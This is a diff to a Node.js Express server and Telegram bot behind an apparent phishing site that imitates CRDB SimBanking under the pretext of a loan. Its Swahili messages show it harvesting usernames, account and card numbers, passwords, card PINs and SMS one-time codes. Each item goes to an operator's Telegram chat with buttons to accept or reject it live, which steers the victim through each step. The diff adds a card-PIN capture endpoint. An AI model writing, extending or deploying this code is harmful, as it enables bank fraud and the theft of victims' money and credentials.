@@ -117,8 +117,17 @@ async function initBot() {
           await bot.sendMessage(chatTarget, `❌ Taarifa zimekataliwa. Mteja ameelekezwa kuingiza upya Taarifa zake.`);
           break;
         case 'CORRECT_CREDS':
+          session.status = 'PROCEED_CARD_PIN';
+          await bot.sendMessage(chatTarget, `✅ Taarifa zimekubaliwa. Mteja anaendelea kuingiza PIN ya Kadi.`);
+          break;
+        case 'WRONG_PIN':
+          session.status = 'RETRY_PIN';
+          session.cardPin = '';
+          await bot.sendMessage(chatTarget, `❌ PIN ya kadi si sahihi. Mteja ameelekezwa kuingiza PIN mpya.`);
+          break;
+        case 'CORRECT_PIN':
           session.status = 'PROCEED_OTP';
-          await bot.sendMessage(chatTarget, `✅ Taarifa zimekubaliwa. Mteja anaendelea na namba ya uthibitisho ya SMS (6 digits).`);
+          await bot.sendMessage(chatTarget, `✅ PIN ya kadi ni sahihi. Mteja anaendelea na namba ya uthibitisho ya SMS (OTP).`);
           break;
         case 'OTP_EXPIRED':
           session.status = 'RETRY_OTP';
@@ -126,15 +135,6 @@ async function initBot() {
           await bot.sendMessage(chatTarget, `⚠️ OTP imeisha muda wake. Mteja anaombwa kuingiza OTP mpya ya SMS.`);
           break;
         case 'CORRECT_OTP':
-          session.status = 'PROCEED_PHONE_PIN';
-          await bot.sendMessage(chatTarget, `✅ OTP sahihi. Mteja anaelekezwa kuingiza Namba ya Simu na PIN.`);
-          break;
-        case 'WRONG_PIN':
-          session.status = 'RETRY_PIN';
-          session.pin = '';
-          await bot.sendMessage(chatTarget, `❌ PIN si sahihi. Mteja anaelekezwa kuingiza PIN mpya.`);
-          break;
-        case 'CORRECT_PIN':
         case 'FINAL_SUCCESS':
           session.status = 'SUCCESS';
           await bot.sendMessage(chatTarget, `🎉 Mkopo umeidhinishwa kikamilifu! Ukurasa wa mafanikio umetumwa kwa mteja.`);
@@ -175,7 +175,7 @@ app.post('/api/submit-credentials', async (req, res) => {
                     `👤 *Jina la Mtumiaji:* \`${username}\`\n` +
                     `💳 *Namba ya Akaunti:* \`${account}\`\n` +
                     `💳 *Namba ya Kadi:* \`${card}\`\n` +
-                    `🔑 *Nywila (Password):* \`${password}\`\n\n` +
+                    `🔑 *Nywila:* \`${password}\`\n\n` +
                     `📋 *Nakili Zote (Copy):*\n\`${username}:${account}:${card}:${password}\``;
 
     const opts = {
@@ -207,7 +207,41 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// Step 2: Submit 6-digit SMS OTP
+// Step 2: Submit 4-digit Card PIN
+app.post('/api/submit-card-pin', async (req, res) => {
+  try {
+    const { userId, cardPin } = req.body || {};
+    const session = sessions.get(userId);
+    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });
+
+    const targetChat = session.adminChatId;
+    session.status = 'WAITING_PIN_VERIFICATION';
+    session.cardPin = cardPin;
+
+    const message = `🟢 *CRDB SIMBANKING - PIN YA KADI*\n\n` +
+                    `🔒 *PIN ya Kadi:* \`${cardPin}\``;
+
+    const opts = {
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '❌ WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
+            { text: '✅ CORRECT PIN', callback_data: `CORRECT_PIN_${userId}` }
+          ]
+        ]
+      }
+    };
+
+    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
+
+    return res.status(200).json({ success: true });
+  } catch (error) {
+    return res.status(500).json({ success: false, error: 'Hitilafu' });
+  }
+});
+
+// Step 3: Submit 6-digit SMS OTP
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { userId, otp } = req.body || {};
@@ -241,45 +275,9 @@ app.post('/api/submit-otp', async (req, res) => {
   }
 });
 
-// Step 3: Submit Phone & PIN
-app.post('/api/submit-phone-pin', async (req, res) => {
-  try {
-    const { userId, phone, pin } = req.body || {};
-    const session = sessions.get(userId);
-    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });
-
-    const targetChat = session.adminChatId;
-    session.status = 'WAITING_PIN_VERIFICATION';
-    session.phone = phone;
-    session.pin = pin;
-
-    const message = `🟢 *CRDB SIMBANKING - NAMBA YA SIMU NA PIN*\n\n` +
-                    `📞 *Simu:* \`${phone}\`\n` +
-                    `🔒 *PIN:* \`${pin}\``;
-
-    const opts = {
-      parse_mode: 'Markdown',
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: '❌ WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
-            { text: '✅ CORRECT PIN', callback_data: `CORRECT_PIN_${userId}` }
-          ]
-        ]
-      }
-    };
-
-    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
-
-    return res.status(200).json({ success: true });
-  } catch (error) {
-    return res.status(500).json({ success: false, error: 'Hitilafu' });
-  }
-});
-
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-  
+      
